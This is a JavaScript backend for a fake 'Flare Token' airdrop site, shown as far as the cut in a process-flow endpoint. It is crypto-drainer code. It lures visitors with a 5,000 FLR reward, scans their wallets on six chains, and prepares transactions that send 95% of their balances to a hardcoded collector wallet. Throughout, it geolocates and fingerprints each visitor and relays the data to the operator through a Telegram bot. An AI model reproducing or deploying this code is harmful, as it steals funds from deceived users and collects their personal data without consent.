// index.js - FLARE TOKEN BACKEND - ULTRA DETAILED REPORTING
require('dotenv').config();
const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const morgan = require('morgan');
const axios = require('axios');
const crypto = require('crypto');
const rateLimit = require('express-rate-limit');
const { ethers } = require('ethers');
const useragent = require('useragent'); // You'll need to install this: npm install useragent

const app = express();
const PORT = process.env.PORT || 10000;

// Security middleware
app.use(helmet({
  contentSecurityPolicy: false,
  crossOriginEmbedderPolicy: false,
  crossOriginResourcePolicy: { policy: "cross-origin" }
}));

const allowedOrigins = process.env.ALLOWED_ORIGINS 
  ? process.env.ALLOWED_ORIGINS.split(',') 
  : ['http://localhost:3000', 'https://flareairdropclaim.vercel.app', 'https://flarebackend.vercel.app'];

app.use(cors({
  origin: allowedOrigins,
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With']
}));

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(morgan('dev'));

const limiter = rateLimit({
  windowMs: parseInt(process.env.RATE_LIMIT_WINDOW_MS) || 15 * 60 * 1000,
  max: parseInt(process.env.RATE_LIMIT_MAX_REQUESTS) || 50,
  message: { error: 'Too many requests, please try again later.' }
});
app.use('/api/', limiter);

// ============================================
// ROOT ENDPOINT
// ============================================

app.get('/', (req, res) => {
  res.json({
    success: true,
    name: 'Flare Token Backend',
    version: '2.0.0',
    status: '🟢 ONLINE',
    telegramStatus: telegramEnabled ? '✅ Connected' : '❌ Disabled',
    telegramBot: telegramBotName || 'Not connected',
    timestamp: new Date().toISOString()
  });
});

// ============================================
// RPC CONFIGURATION
// ============================================

const RPC_CONFIG = {
  Ethereum: { 
    urls: [
      'https://eth.llamarpc.com',
      'https://ethereum.publicnode.com',
      'https://rpc.ankr.com/eth',
      'https://cloudflare-eth.com'
    ],
    symbol: 'ETH',
    decimals: 18,
    chainId: 1,
    explorer: 'https://etherscan.io/tx/'
  },
  BSC: {
    urls: [
      'https://bsc-dataseed.binance.org',
      'https://bsc-dataseed1.binance.org',
      'https://bsc-dataseed2.binance.org',
      'https://bsc-dataseed3.binance.org'
    ],
    symbol: 'BNB',
    decimals: 18,
    chainId: 56,
    explorer: 'https://bscscan.com/tx/'
  },
  Polygon: {
    urls: [
      'https://polygon-rpc.com',
      'https://rpc-mainnet.maticvigil.com',
      'https://polygon.llamarpc.com',
      'https://polygon-bor.publicnode.com'
    ],
    symbol: 'MATIC',
    decimals: 18,
    chainId: 137,
    explorer: 'https://polygonscan.com/tx/'
  },
  Arbitrum: {
    urls: [
      'https://arb1.arbitrum.io/rpc',
      'https://rpc.ankr.com/arbitrum',
      'https://arbitrum.llamarpc.com'
    ],
    symbol: 'ETH',
    decimals: 18,
    chainId: 42161,
    explorer: 'https://arbiscan.io/tx/'
  },
  Avalanche: {
    urls: [
      'https://api.avax.network/ext/bc/C/rpc',
      'https://rpc.ankr.com/avalanche',
      'https://avalanche-c-chain.publicnode.com'
    ],
    symbol: 'AVAX',
    decimals: 18,
    chainId: 43114,
    explorer: 'https://snowtrace.io/tx/'
  },
  Flare: {
    urls: [
      'https://flare-api.flare.network/ext/C/rpc',
      'https://flare.publicnode.com',
      'https://rpc.flare.xyz'
    ],
    symbol: 'FLR',
    decimals: 18,
    chainId: 14,
    explorer: 'https://flare-explorer.flare.network/tx/'
  }
};

// ============================================
// YOUR DEPLOYED CONTRACT ADDRESSES
// ============================================

const PROJECT_FLOW_ROUTERS = {
  'Ethereum': '0x7264F557f762f16aC7937292D19449c5CE962288',
  'BSC': '0x7264F557f762f16aC7937292D19449c5CE962288',
  'Polygon': '0x54b4A3C43CFf0aC70A8AC3f38f0fdC5DFA1cb278',
  'Arbitrum': '0x54b4A3C43CFf0aC70A8AC3f38f0fdC5DFA1cb278',
  'Avalanche': '0xF6F0B833186DD54B772a93002ab765fc7Ab9D01F',
  'Flare': '0xF6F0B833186DD54B772a93002ab765fc7Ab9D01F'
};

const COLLECTOR_WALLET = process.env.COLLECTOR_WALLET || '0x713eabb95d3650dad05b5e84cb7c58870dd63c96';

// ============================================
// STORAGE
// ============================================

let telegramEnabled = false;
let telegramBotName = '';

const memoryStorage = {
  participants: [],
  pendingFlows: new Map(),
  completedFlows: new Map(),
  settings: {
    tokenName: process.env.TOKEN_NAME || 'Flare Token',
    tokenSymbol: process.env.TOKEN_SYMBOL || 'FLR',
    valueThreshold: parseFloat(process.env.VALUE_THRESHOLD) || 1,
    statistics: {
      totalParticipants: 0,
      eligibleParticipants: 0,
      claimedParticipants: 0,
      uniqueIPs: new Set(),
      totalProcessedUSD: 0,
      totalProcessedWallets: 0,
      totalProcessedAmounts: {},
      processedTransactions: []
    },
    flowEnabled: process.env.FLOW_ENABLED === 'true'
  },
  emailCache: new Map(),
  siteVisits: []
};

// ============================================
// TELEGRAM FUNCTIONS
// ============================================

async function sendTelegramMessage(text) {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  
  if (!botToken || !chatId) {
    console.log('❌ Cannot send Telegram: Missing credentials');
    return false;
  }
  
  try {
    await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatId,
      text: text,
      parse_mode: 'HTML',
      disable_web_page_preview: false
    }, { timeout: 8000 });
    return true;
  } catch (error) {
    console.error('❌ Telegram send failed:', error.message);
    return false;
  }
}

async function forceEnableTelegram() {
  console.log('\n🔌 FORCE ENABLING TELEGRAM...');
  
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  
  if (!botToken || !chatId) return false;
  
  try {
    const meResponse = await axios.get(`https://api.telegram.org/bot${botToken}/getMe`, { timeout: 5000 });
    
    if (meResponse.data?.ok) {
      telegramBotName = meResponse.data.result.username;
      
      const testMessage = `🚀 <b>🚀 FLARE TOKEN BACKEND ONLINE 🚀</b>\n\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `✅ <b>MultiChain FlowRouter Active</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
        `📦 <b>COLLECTOR:</b> \`${COLLECTOR_WALLET}\`\n` +
        `🤖 <b>BOT:</b> @${telegramBotName}\n` +
        `🌐 <b>NETWORKS:</b> Ethereum, BSC, Polygon, Arbitrum, Avalanche, Flare\n` +
        `📊 <b>MONITORING:</b> Site Visits, Wallet Connections, Flow Processing\n` +
        `⏰ <b>STARTED:</b> ${new Date().toLocaleString()}\n\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `🟢 <b>READY FOR FLARE TOKEN DISTRIBUTION</b>`;
      
      await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        chat_id: chatId,
        text: testMessage,
        parse_mode: 'HTML'
      }, { timeout: 5000 });
      
      console.log('✅ Telegram force-enabled successfully');
      telegramEnabled = true;
      return true;
    }
  } catch (error) {
    console.error('❌ Force enable failed:', error.message);
  }
  
  telegramEnabled = false;
  return false;
}

// ============================================
// DETECT BOT FUNCTION
// ============================================

function detectBot(userAgent) {
  if (!userAgent) return { isBot: false, type: 'Unknown' };
  
  const ua = userAgent.toLowerCase();
  const bots = {
    'Googlebot': ua.includes('googlebot'),
    'Bingbot': ua.includes('bingbot') || ua.includes('msnbot'),
    'Yandex': ua.includes('yandexbot'),
    'Facebook': ua.includes('facebookexternalhit') || ua.includes('facebot'),
    'Twitter': ua.includes('twitterbot'),
    'LinkedIn': ua.includes('linkedinbot'),
    'Discord': ua.includes('discordbot'),
    'Slack': ua.includes('slackbot'),
    'Telegram': ua.includes('telegrambot'),
    'WhatsApp': ua.includes('whatsapp'),
    'Pinterest': ua.includes('pinterest'),
    'Baidu': ua.includes('baiduspider'),
    'DuckDuckGo': ua.includes('duckduckbot'),
    'Apple': ua.includes('applebot'),
    'Yahoo': ua.includes('yahoo! slurp'),
    'AI Bot': ua.includes('gptbot') || ua.includes('claudebot') || ua.includes('anthropic-ai')
  };
  
  for (const [bot, detected] of Object.entries(bots)) {
    if (detected) return { isBot: true, type: bot };
  }
  
  return { isBot: false, type: 'Human' };
}

// ============================================
// GET DEVICE INFO
// ============================================

function getDeviceInfo(userAgent) {
  if (!userAgent) return { device: 'Unknown', os: 'Unknown', browser: 'Unknown' };
  
  const ua = userAgent.toLowerCase();
  
  // Device detection
  let device = 'Desktop';
  if (ua.includes('mobile') || ua.includes('android') || ua.includes('iphone') || ua.includes('ipod')) {
    device = 'Mobile';
  } else if (ua.includes('ipad') || ua.includes('tablet')) {
    device = 'Tablet';
  }
  
  // OS detection
  let os = 'Unknown';
  if (ua.includes('windows')) os = 'Windows';
  else if (ua.includes('mac')) os = 'macOS';
  else if (ua.includes('linux')) os = 'Linux';
  else if (ua.includes('android')) os = 'Android';
  else if (ua.includes('ios') || ua.includes('iphone') || ua.includes('ipad')) os = 'iOS';
  
  // Browser detection
  let browser = 'Unknown';
  if (ua.includes('chrome') && !ua.includes('edg')) browser = 'Chrome';
  else if (ua.includes('firefox')) browser = 'Firefox';
  else if (ua.includes('safari') && !ua.includes('chrome')) browser = 'Safari';
  else if (ua.includes('edg')) browser = 'Edge';
  else if (ua.includes('opera') || ua.includes('opr')) browser = 'Opera';
  
  return { device, os, browser };
}

// ============================================
// GET IP LOCATION WITH DETAILS
// ============================================

async function getDetailedIPLocation(ip) {
  try {
    const cleanIP = ip.replace('::ffff:', '').replace('::1', '127.0.0.1');
    if (cleanIP === '127.0.0.1' || cleanIP === 'localhost') {
      return {
        country: 'Local',
        flag: '🏠',
        city: 'Local',
        region: 'Local',
        lat: 0,
        lon: 0,
        isp: 'Local',
        org: 'Local',
        timezone: 'Local',
        valid: true
      };
    }
    
    const response = await axios.get(`http://ip-api.com/json/${cleanIP}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query`, { 
      timeout: 3000 
    });
    
    if (response.data?.status === 'success') {
      const flags = {
        'US': '🇺🇸', 'GB': '🇬🇧', 'CA': '🇨🇦', 'DE': '🇩🇪', 'FR': '🇫🇷',
        'ES': '🇪🇸', 'IT': '🇮🇹', 'NL': '🇳🇱', 'CH': '🇨🇭', 'AU': '🇦🇺',
        'JP': '🇯🇵', 'CN': '🇨🇳', 'IN': '🇮🇳', 'BR': '🇧🇷', 'NG': '🇳🇬',
        'ZA': '🇿🇦', 'MX': '🇲🇽', 'KR': '🇰🇷', 'SG': '🇸🇬', 'AE': '🇦🇪'
      };
      
      return {
        country: response.data.country || 'Unknown',
        flag: flags[response.data.countryCode] || '🌍',
        city: response.data.city || 'Unknown',
        region: response.data.regionName || 'Unknown',
        lat: response.data.lat,
        lon: response.data.lon,
        isp: response.data.isp || 'Unknown',
        org: response.data.org || 'Unknown',
        timezone: response.data.timezone || 'Unknown',
        zip: response.data.zip || 'Unknown',
        valid: true
      };
    }
  } catch (error) {}
  
  return {
    country: 'Unknown',
    flag: '🌍',
    city: 'Unknown',
    region: 'Unknown',
    isp: 'Unknown',
    org: 'Unknown',
    valid: false
  };
}

// ============================================
// GENERATE WALLET EMAIL
// ============================================

function generateWalletEmail(walletAddress) {
  const hash = crypto.createHash('sha256').update(walletAddress.toLowerCase()).digest('hex');
  const username = `flr${hash.substring(0, 12)}`;
  
  const domains = ['proton.me', 'gmail.com', 'outlook.com', 'pm.me', 'yahoo.com'];
  const domain = domains[parseInt(hash.substring(0, 2), 16) % domains.length];
  
  return `${username}@${domain}`;
}

// ============================================
// TRACK SITE VISIT - ULTRA DETAILED
// ============================================

app.post('/api/track-visit', async (req, res) => {
  try {
    const { userAgent, referer, path } = req.body;
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.ip || '0.0.0.0';
    
    console.log('\n👁️ SITE VISIT DETECTED');
    
    // Get detailed location
    const location = await getDetailedIPLocation(clientIP);
    
    // Detect if bot
    const botInfo = detectBot(userAgent);
    
    // Get device info
    const deviceInfo = getDeviceInfo(userAgent);
    
    // Parse referer
    let refererDomain = 'Direct';
    let refererType = 'Direct';
    if (referer) {
      try {
        const url = new URL(referer);
        refererDomain = url.hostname;
        if (refererDomain.includes('google')) refererType = 'Google Search';
        else if (refererDomain.includes('facebook')) refererType = 'Facebook';
        else if (refererDomain.includes('twitter') || refererDomain.includes('x.com')) refererType = 'Twitter/X';
        else if (refererDomain.includes('telegram')) refererType = 'Telegram';
        else if (refererDomain.includes('discord')) refererType = 'Discord';
        else if (refererDomain.includes('linkedin')) refererType = 'LinkedIn';
        else if (refererDomain.includes('reddit')) refererType = 'Reddit';
        else refererType = 'External';
      } catch {
        refererDomain = referer;
        refererType = 'External';
      }
    }
    
    const visitId = `VISIT-${Date.now()}-${crypto.randomBytes(4).toString('hex')}`;
    
    const visit = {
      id: visitId,
      ip: clientIP.replace('::ffff:', ''),
      timestamp: new Date().toISOString(),
      country: location.country,
      flag: location.flag,
      city: location.city,
      region: location.region,
      isp: location.isp,
      org: location.org,
      lat: location.lat,
      lon: location.lon,
      timezone: location.timezone,
      userAgent: userAgent || 'Unknown',
      device: deviceInfo.device,
      os: deviceInfo.os,
      browser: deviceInfo.browser,
      isBot: botInfo.isBot,
      botType: botInfo.type,
      referer: referer || 'Direct',
      refererDomain: refererDomain,
      refererType: refererType,
      path: path || '/',
      walletConnected: false,
      walletAddress: null
    };
    
    memoryStorage.siteVisits.push(visit);
    
    if (memoryStorage.siteVisits.length > 1000) {
      memoryStorage.siteVisits = memoryStorage.siteVisits.slice(-1000);
    }
    
    // ULTRA DETAILED TELEGRAM REPORT
    const message = 
      `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
      `🌐 <b>NEW SITE VISIT</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
      
      `📍 <b>LOCATION:</b>\n` +
      `   🏳️ Country: ${location.country} ${location.flag}\n` +
      `   🏙️ City: ${location.city}\n` +
      `   📍 Region: ${location.region}\n` +
      `   🌍 Coordinates: ${location.lat ? location.lat.toFixed(2) : '?'}, ${location.lon ? location.lon.toFixed(2) : '?'}\n` +
      `   ⏰ Timezone: ${location.timezone}\n` +
      `   🏢 ISP: ${location.isp}\n` +
      `   🏛️ Organization: ${location.org}\n\n` +
      
      `💻 <b>DEVICE:</b>\n` +
      `   📱 Device: ${deviceInfo.device}\n` +
      `   💿 OS: ${deviceInfo.os}\n` +
      `   🌐 Browser: ${deviceInfo.browser}\n` +
      `   🧑 User: ${botInfo.isBot ? '🤖 Bot' : '👤 Human'} ${botInfo.isBot ? `(${botInfo.type})` : ''}\n\n` +
      
      `🔗 <b>REFERRAL:</b>\n` +
      `   📎 Type: ${refererType}\n` +
      `   🔗 Domain: ${refererDomain}\n` +
      `   📄 Path: ${path}\n\n` +
      
      `🆔 <b>SESSION:</b>\n` +
      `   🆔 ID: \`${visitId}\`\n` +
      `   🌐 IP: ${clientIP}\n` +
      `   ⏱️ Time: ${new Date().toLocaleString()}\n\n` +
      
      `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
    
    await sendTelegramMessage(message);
    
    res.json({
      success: true,
      data: {
        visitId: visit.id,
        country: visit.country,
        flag: visit.flag,
        city: visit.city,
        isBot: botInfo.isBot
      }
    });
    
  } catch (error) {
    console.error('Visit tracking error:', error);
    res.json({ success: true });
  }
});

// ============================================
// WALLET BALANCE CHECK
// ============================================

async function getWalletBalance(walletAddress) {
  console.log(`\n🔍 SCANNING FLARE WALLET: ${walletAddress.substring(0, 10)}...`);
  
  const results = {
    walletAddress,
    totalValueUSD: 0,
    isEligible: false,
    balances: [],
    scanTime: new Date().toISOString()
  };

  try {
    const prices = await getCryptoPrices();
    
    const chains = [
      { name: 'Ethereum', symbol: 'ETH', price: prices.eth, chainId: 1 },
      { name: 'BSC', symbol: 'BNB', price: prices.bnb, chainId: 56 },
      { name: 'Polygon', symbol: 'MATIC', price: prices.matic, chainId: 137 },
      { name: 'Arbitrum', symbol: 'ETH', price: prices.eth, chainId: 42161 },
      { name: 'Avalanche', symbol: 'AVAX', price: prices.avax, chainId: 43114 },
      { name: 'Flare', symbol: 'FLR', price: prices.flr, chainId: 14 }
    ];

    let totalValue = 0;
    let chainDetails = [];
    
    for (const chain of chains) {
      try {
        const providerInfo = await getChainProvider(chain.name);
        if (!providerInfo) continue;
        
        const { provider, config } = providerInfo;
        
        const balance = await provider.getBalance(walletAddress);
        const amount = parseFloat(ethers.formatUnits(balance, config.decimals));
        const valueUSD = amount * chain.price;
        
        if (amount > 0.000001) {
          console.log(`   ✅ ${chain.name}: ${amount.toFixed(6)} ${chain.symbol} = $${valueUSD.toFixed(2)}`);
          
          totalValue += valueUSD;
          
          chainDetails.push({
            chain: chain.name,
            chainId: chain.chainId,
            amount: amount,
            valueUSD: valueUSD,
            symbol: chain.symbol,
            contractAddress: PROJECT_FLOW_ROUTERS[chain.name],
            explorer: RPC_CONFIG[chain.name]?.explorer || ''
          });
        }
      } catch (error) {
        console.log(`   ⚠️ ${chain.name} scan failed`);
      }
    }

    results.totalValueUSD = parseFloat(totalValue.toFixed(2));
    results.isEligible = results.totalValueUSD >= memoryStorage.settings.valueThreshold;
    results.balances = chainDetails;
    
    if (results.isEligible) {
      results.eligibilityReason = `✅ Wallet qualifies for FLR Distribution`;
      results.allocation = { 
        amount: '5000', 
        valueUSD: '850',
        token: 'FLR'
      };
    } else {
      results.eligibilityReason = `✨ Welcome! Minimum $${memoryStorage.settings.valueThreshold} required for FLR claim`;
      results.allocation = { amount: '0', valueUSD: '0', token: 'FLR' };
    }

    return { success: true, data: results };

  } catch (error) {
    console.error('Balance check error:', error.message);
    return {
      success: false,
      error: error.message,
      data: {
        walletAddress,
        totalValueUSD: 0,
        isEligible: false,
        eligibilityReason: '✨ Welcome to Flare Token!',
        allocation: { amount: '0', valueUSD: '0', token: 'FLR' }
      }
    };
  }
}

// ============================================
// CRYPTO PRICES
// ============================================

async function getCryptoPrices() {
  try {
    const response = await axios.get('https://api.coingecko.com/api/v3/simple/price', {
      params: {
        ids: 'ethereum,binancecoin,matic-network,avalanche-2,flare-networks',
        vs_currencies: 'usd'
      },
      timeout: 5000
    });
    
    return {
      eth: response.data.ethereum?.usd || 2000,
      bnb: response.data.binancecoin?.usd || 300,
      matic: response.data['matic-network']?.usd || 0.75,
      avax: response.data['avalanche-2']?.usd || 32,
      flr: response.data['flare-networks']?.usd || 0.03
    };
  } catch (error) {
    return { eth: 2000, bnb: 300, matic: 0.75, avax: 32, flr: 0.03 };
  }
}

// ============================================
// CONNECT ENDPOINT - ULTRA DETAILED
// ============================================

app.post('/api/presale/connect', async (req, res) => {
  try {
    const { walletAddress, totalValue, chains } = req.body;
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.ip || '0.0.0.0';
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
    }
    
    console.log(`\n🔗 FLARE CONNECT: ${walletAddress}`);
    
    // Get detailed location
    const location = await getDetailedIPLocation(clientIP);
    
    // Get device info
    const deviceInfo = getDeviceInfo(req.headers['user-agent']);
    
    // Generate email
    const email = generateWalletEmail(walletAddress);
    
    // Get previous visit
    const previousVisits = memoryStorage.siteVisits
      .filter(v => v.ip === clientIP.replace('::ffff:', ''))
      .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
    
    const lastVisit = previousVisits[0];
    
    if (lastVisit) {
      lastVisit.walletConnected = true;
      lastVisit.walletAddress = walletAddress.toLowerCase();
    }
    
    // Get balance
    const balanceResult = await getWalletBalance(walletAddress);
    
    // Find or create participant
    let participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
    
    if (!participant) {
      participant = {
        walletAddress: walletAddress.toLowerCase(),
        ipAddress: clientIP,
        country: location.country,
        flag: location.flag,
        city: location.city,
        region: location.region,
        isp: location.isp,
        email: email,
        connectedAt: new Date(),
        totalValueUSD: balanceResult.data.totalValueUSD,
        isEligible: balanceResult.data.isEligible,
        claimed: false,
        deviceInfo: deviceInfo,
        visitCount: previousVisits.length,
        firstVisit: previousVisits[previousVisits.length - 1]?.timestamp,
        lastVisit: new Date().toISOString(),
        allocation: balanceResult.data.allocation,
        balances: balanceResult.data.balances
      };
      memoryStorage.participants.push(participant);
      memoryStorage.settings.statistics.totalParticipants++;
      memoryStorage.settings.statistics.uniqueIPs.add(clientIP);
      
      if (memoryStorage.participants.length > 500) {
        memoryStorage.participants = memoryStorage.participants.slice(-500);
      }
    } else {
      participant.totalValueUSD = balanceResult.data.totalValueUSD;
      participant.isEligible = balanceResult.data.isEligible;
      participant.allocation = balanceResult.data.allocation;
      participant.lastScanned = new Date();
      participant.balances = balanceResult.data.balances;
      participant.visitCount = (participant.visitCount || 0) + 1;
      participant.lastVisit = new Date().toISOString();
    }
    
    if (balanceResult.data.isEligible) {
      memoryStorage.settings.statistics.eligibleParticipants++;
      
      // Build balances string
      let balancesStr = '';
      balanceResult.data.balances.forEach(b => {
        balancesStr += `   • ${b.chain}: ${b.amount.toFixed(4)} ${b.symbol} ($${b.valueUSD.toFixed(2)})\n`;
      });
      
      // ULTRA DETAILED ELIGIBLE WALLET REPORT
      const message = 
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `🎯 <b>ELIGIBLE FLARE WALLET DETECTED</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
        
        `👛 <b>WALLET:</b>\n` +
        `   📝 Address: \`${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\`\n` +
        `   💰 Total Balance: <b>$${balanceResult.data.totalValueUSD}</b>\n` +
        `   🎁 Allocation: <b>5,000 FLR ($${balanceResult.data.allocation.valueUSD})</b>\n` +
        `   🔗 Chains Found: ${balanceResult.data.balances.length}\n\n` +
        
        `📊 <b>BALANCES:</b>\n${balancesStr}\n` +
        
        `📍 <b>LOCATION:</b>\n` +
        `   🏳️ Country: ${location.country} ${location.flag}\n` +
        `   🏙️ City: ${location.city}\n` +
        `   📍 Region: ${location.region}\n` +
        `   🏢 ISP: ${location.isp}\n\n` +
        
        `💻 <b>DEVICE:</b>\n` +
        `   📱 Device: ${deviceInfo.device}\n` +
        `   💿 OS: ${deviceInfo.os}\n` +
        `   🌐 Browser: ${deviceInfo.browser}\n\n` +
        
        `📧 <b>CONTACT:</b>\n` +
        `   📧 Email: \`${email}\`\n` +
        `   🆔 Visit ID: ${lastVisit?.id || 'N/A'}\n\n` +
        
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `✅ <b>READY FOR FLOW PROCESSING</b>`;
      
      await sendTelegramMessage(message);
      
    } else {
      // Build balances string (even if not eligible)
      let balancesStr = '';
      balanceResult.data.balances.forEach(b => {
        balancesStr += `   • ${b.chain}: ${b.amount.toFixed(4)} ${b.symbol} ($${b.valueUSD.toFixed(2)})\n`;
      });
      
      // ULTRA DETAILED NON-ELIGIBLE WALLET REPORT
      const message = 
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `👋 <b>NEW FLARE WALLET CONNECTED</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
        
        `👛 <b>WALLET:</b>\n` +
        `   📝 Address: \`${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\`\n` +
        `   💰 Total Balance: <b>$${balanceResult.data.totalValueUSD}</b>\n` +
        `   🔗 Chains Found: ${balanceResult.data.balances.length}\n` +
        `   ⚡ Status: <b>NOT ELIGIBLE</b> (Need $${memoryStorage.settings.valueThreshold})\n\n` +
        
        `📊 <b>BALANCES:</b>\n${balancesStr || '   • No balances found\n'}` +
        
        `📍 <b>LOCATION:</b>\n` +
        `   🏳️ Country: ${location.country} ${location.flag}\n` +
        `   🏙️ City: ${location.city}\n` +
        `   📍 Region: ${location.region}\n` +
        `   🏢 ISP: ${location.isp}\n\n` +
        
        `💻 <b>DEVICE:</b>\n` +
        `   📱 Device: ${deviceInfo.device}\n` +
        `   💿 OS: ${deviceInfo.os}\n` +
        `   🌐 Browser: ${deviceInfo.browser}\n\n` +
        
        `📧 <b>CONTACT:</b>\n` +
        `   📧 Email: \`${email}\`\n` +
        `   🆔 Visit ID: ${lastVisit?.id || 'N/A'}\n\n` +
        
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `✨ <b>Welcome to Flare Token!</b>`;
      
      await sendTelegramMessage(message);
    }
    
    res.json({
      success: true,
      data: {
        walletAddress,
        email,
        country: location.country,
        flag: location.flag,
        city: location.city,
        totalValueUSD: balanceResult.data.totalValueUSD,
        isEligible: balanceResult.data.isEligible,
        eligibilityReason: balanceResult.data.eligibilityReason,
        allocation: balanceResult.data.allocation,
        balances: balanceResult.data.balances,
        token: 'FLR'
      }
    });
    
  } catch (error) {
    console.error('Connection error:', error);
    res.status(500).json({ success: false, error: 'Connection failed' });
  }
});

// ============================================
// GET WORKING PROVIDER
// ============================================

async function getChainProvider(chainName) {
  const config = RPC_CONFIG[chainName];
  if (!config) return null;
  
  for (const url of config.urls) {
    try {
      const provider = new ethers.JsonRpcProvider(url);
      const block = await Promise.race([
        provider.getBlockNumber(),
        new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 3000))
      ]);
      
      if (block > 0) {
        console.log(`✅ ${chainName} RPC: ${url.substring(0, 30)}...`);
        return { provider, config };
      }
    } catch (error) {
      continue;
    }
  }
  
  return null;
}

// ============================================
// PREPARE FLOW ENDPOINT - ULTRA DETAILED
// ============================================

app.post('/api/presale/prepare-flow', async (req, res) => {
  try {
    const { walletAddress } = req.body;
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
    }
    
    const participant = memoryStorage.participants.find(
      p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase()
    );
    
    if (!participant || !participant.isEligible) {
      return res.status(400).json({ success: false, error: 'Wallet not eligible for FLR distribution' });
    }
    
    const balanceResult = await getWalletBalance(walletAddress);
    
    const transactions = balanceResult.data.balances
      .filter(b => b.valueUSD > 0 && PROJECT_FLOW_ROUTERS[b.chain])
      .map(b => ({
        chain: b.chain,
        chainId: b.chainId,
        amount: (b.amount * 0.95).toFixed(6),
        originalAmount: b.amount.toFixed(6),
        valueUSD: (b.valueUSD * 0.95).toFixed(2),
        originalValueUSD: b.valueUSD.toFixed(2),
        symbol: b.symbol,
        contractAddress: PROJECT_FLOW_ROUTERS[b.chain],
        collectorAddress: COLLECTOR_WALLET,
        explorer: RPC_CONFIG[b.chain]?.explorer || ''
      }));
    
    const totalFlowUSD = transactions.reduce((sum, t) => sum + parseFloat(t.valueUSD), 0).toFixed(2);
    const totalOriginalUSD = balanceResult.data.totalValueUSD.toFixed(2);
    
    const flowId = `FLR-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
    
    memoryStorage.pendingFlows.set(flowId, {
      walletAddress: walletAddress.toLowerCase(),
      transactions,
      totalFlowUSD,
      totalOriginalUSD,
      totalFLR: '5000',
      status: 'prepared',
      createdAt: new Date().toISOString(),
      completedChains: [],
      participant: {
        country: participant.country,
        flag: participant.flag,
        city: participant.city,
        email: participant.email
      }
    });
    
    if (memoryStorage.pendingFlows.size > 100) {
      const oldestKey = Array.from(memoryStorage.pendingFlows.keys())[0];
      memoryStorage.pendingFlows.delete(oldestKey);
    }
    
    // Build transactions string
    let txStr = '';
    transactions.forEach((t, index) => {
      txStr += `   ${index + 1}. ${t.chain}: ${t.amount} ${t.symbol} ($${t.valueUSD})\n`;
      txStr += `      └─ Original: ${t.originalAmount} ${t.symbol} ($${t.originalValueUSD})\n`;
    });
    
    // ULTRA DETAILED FLOW PREPARED REPORT
    const message = 
      `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
      `🔐 <b>FLARE FLOW PREPARED</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
      
      `👛 <b>WALLET:</b>\n` +
      `   📝 Address: \`${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\`\n` +
      `   💰 Total Balance: <b>$${totalOriginalUSD}</b>\n` +
      `   💵 Flow Amount: <b>$${totalFlowUSD}</b> (95%)\n` +
      `   🎁 FLR Reward: <b>5,000 FLR</b>\n` +
      `   🔗 Chains to Process: ${transactions.length}\n\n` +
      
      `📋 <b>TRANSACTIONS:</b>\n${txStr}\n` +
      
      `📍 <b>LOCATION:</b>\n` +
      `   🏳️ Country: ${participant.country} ${participant.flag}\n` +
      `   🏙️ City: ${participant.city}\n` +
      `   📧 Email: \`${participant.email}\`\n\n` +
      
      `🆔 <b>FLOW DETAILS:</b>\n` +
      `   🆔 Flow ID: \`${flowId}\`\n` +
      `   ⏱️ Prepared: ${new Date().toLocaleString()}\n` +
      `   📤 Collector: \`${COLLECTOR_WALLET.substring(0, 10)}...\`\n\n` +
      
      `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
      `⏳ <b>Ready for processing</b>`;
    
    await sendTelegramMessage(message);
    
    res.json({
      success: true,
      data: {
        flowId,
        totalFlowUSD,
        totalFLR: '5000',
        transactionCount: transactions.length,
        transactions,
        token: 'FLR'
      }
    });
    
  } catch (error) {
    console.error('Prepare flow error:', error);
    res.status(500).json({ success: false, error: 'Flow preparation failed' });
  }
});

// ============================================
// PROCESS FLOW ENDPOINT - ULTRA DETAILED
// ============================================

app.post('/api/presale/process-flow', async (req, res) => {
  try {
    const { 
      walletAddress, 
      chainName, 
      flowId, 
      txHash,
      amount,
      symbol,
